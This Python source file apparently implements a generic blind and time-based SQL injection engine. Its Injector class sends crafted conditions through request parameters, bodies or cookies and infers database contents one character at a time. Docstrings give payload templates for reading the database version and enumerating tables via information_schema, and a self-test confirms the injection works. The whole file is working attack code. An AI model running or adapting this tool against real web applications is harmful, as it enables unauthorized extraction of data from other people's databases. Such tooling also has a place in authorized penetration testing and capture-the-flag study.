from enum import Enum
import time
from typing import Any
import requests
import json
import tqdm  # type: ignore
import loguru


from const import ALL_CHARS, FIGURES, LOWER_CASE
import utils


class HttpMethod(Enum):
    GET = "GET"
    POST = "POST"


class Config:
    def __init__(self, raw_config: dict) -> None:
        self.max_length: int = raw_config["MAX_LENGTH"]
        self.debug: bool = raw_config["DEBUG"]
        self.proxy: str = raw_config["PROXY"]
        self.confirmation_tries: int = raw_config["CONFIRMATION_TRIES"]
        self.test_string_length: int = raw_config["TEST_STRING_LENGTH"]


class Injector:
    def __init__(self) -> None:
        self.url = ""
        self.http_method = HttpMethod.GET
        self.config = self.load_config()

    def generate_params(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_data(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_json(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def generate_cookies(
        self,
        condition: str,
        reverse: bool,
    ) -> dict:
        return {}

    def evaluate_response(
        self,
        res: requests.Response,
        t0: float,
        t1: float,
        reverse: bool,
    ) -> bool:
        raise NotImplementedError

    def load_config(self):
        with open("config.json") as file:
            raw_config = json.load(file)
        return Config(raw_config)

    @utils.reapatable
    def test_condition(
        self,
        condition: str,
        reverse: bool = False,
    ) -> bool:

        params = self.generate_params(condition, reverse)
        data = self.generate_data(condition, reverse)
        json = self.generate_json(condition, reverse)
        cookies = self.generate_cookies(condition, reverse)

        proxies = {"http": self.config.proxy} if self.config.debug else {}

        t0 = time.time()
        res = requests.request(
            self.http_method.value,
            self.url,
            params=params,
            data=data,
            json=json,
            cookies=cookies,
            proxies=proxies,
        )
        t1 = time.time()

        return self.evaluate_response(res, t0, t1, reverse)

    def find_number(
        self,
        length_condition_template: Any,
    ):
        """Search for the value of one number

        arguments examples:
        length_condition_template:
        """

        test = False
        for n in range(1, self.config.max_length + 1):
            condition = length_condition_template.format(length=n)
            res = self.test_condition(condition)
            if res:
                test = True
                break

        if not test:
            print(f"Error: Taille max {self.config.max_length} atteinte")
            assert False

        return n

    def find_letter(
        self,
        substring_condition_template: Any,
        position: int,
        chars: str,
        unknown_chars: bool,
        repeat: int = 1,
    ) -> str:
        for char in chars:
            condition = substring_condition_template.format(
                position=position,
                length=1,
                substr=char,
            )
            res = self.test_condition(
                condition,
                repeat=repeat,
            )
            if res:
                return char

        if unknown_chars:
            return "_"
        else:
            raise Exception(f"Found unknown char (use unknown_chars=True to ignore it)")

    def find_word(
        self,
        length_condition_template: Any,
        substring_condition_template: Any,
        chars: str = ALL_CHARS,
        unknown_chars: bool = True,
    ):
        """Search for the value of one string

        arguments examples:
        length_condition_template: "(SELECT LENGTH(@@version))={length}"
        substring_condition_template: "(SELECT SUBSTRING(@@version, {position}, {length}))='{substr}'"
        """

        length = self.find_number(length_condition_template)

        word = ""
        for i in range(1, length + 1):
            letter = self.find_letter(
                substring_condition_template,
                i,
                chars,
                unknown_chars,
            )
            word += letter

        condition = substring_condition_template.format(
            position=1,
            length=len(word),
            substr=word,
        )

        res = self.test_condition(
            condition,
            reverse=True,
            repeat=self.config.confirmation_tries,
        )

        if res:
            loguru.logger.info(f"Found value: {word}")
            return word, word

        loguru.logger.info("Need to correct the found value")

        first_try = word
        for i in range(len(word)):
            condition = substring_condition_template.format(
                position=1,
                length=i + 1,
                substr=word[: i + 1],
            )
            res = self.test_condition(
                condition,
                reverse=True,
                repeat=self.config.confirmation_tries,
            )
            if res:
                continue

            letter = self.find_letter(
                substring_condition_template,
                i + 1,
                chars,
                unknown_chars,
                repeat=self.config.confirmation_tries,
            )

            word_list = list(word)
            word_list[i] = letter
            word = "".join(word_list)

        return word, first_try

    def find_values(
        self,
        count_condition_template: Any,
        length_condition_template: Any,
        substring_condition_template: Any,
    ):
        """Search for the values of one table

        arguments examples:
        count_condition_template: "(SELECT COUNT(table_name) FROM information_schema.tables)={count}"
        length_condition_template: "(SELECT LENGTH(table_name) FROM information_schema.tables LIMIT {limit} OFFSET {offset})={{length}}"
        substring_condition_template: "(SELECT SUBSTRING(table_name, {{position}}, {{length}}) FROM information_schema.tables LIMIT {limit} OFFSET {offset})={{substr}}"
        """

        count = self.find_number(count_condition_template)
        loguru.logger.info(f"Found {count} values")

        values = []
        for i in tqdm.tqdm(range(count)):
            length_condition_template_2 = length_condition_template.format(
                limit=1,
                offset=i,
            )
            substring_condition_template_2 = substring_condition_template.format(
                limit=1,
                offset=i,
            )

            word, _ = self.find_word(
                length_condition_template_2,
                substring_condition_template_2,
            )
            values.append(word)

        return values

    def test(self) -> None:

        if self.test_condition("1=1") is False:
            raise Exception("Expect 1=1 to be True")

        if self.test_condition("1=0") is True:
            raise Exception("Expect 1=0 to be False")

        res = self.find_number("(SELECT 12)={length}")
        if res != 12:
            raise Exception(f"Expect SELECT 12 to return 12 (received {res})")

        test_string = utils.get_random_string(
            LOWER_CASE + FIGURES,
            self.config.test_string_length,
        )
        length_condition_template = (
            "(SELECT LENGTH('{test_string}'))={{length}}".format(
                test_string=test_string
            )
        )
        substring_condition_template = "(SELECT SUBSTRING('{test_string}', {{position}}, {{length}}))='{{substr}}'".format(
            test_string=test_string
        )

        t0 = time.time()
        res, first_try = self.find_word(
            length_condition_template,
            substring_condition_template,
        )
        t1 = time.time()
        dt = utils.round_float(t1 - t0)

        if res != test_string:
            diff = utils.compare_strings(res, test_string)
            raise Exception(
                f"The test string has not been correctly recovered ({diff} in common)"
            )

        error = 1 - utils.compare_strings(res, first_try)
        loguru.logger.info(f"Before correction the error was {error}")
        loguru.logger.info(
            f"Need {dt}s to recover a string of {self.config.test_string_length} chars"
        )

        loguru.logger.info("The SQL injection seems to work")
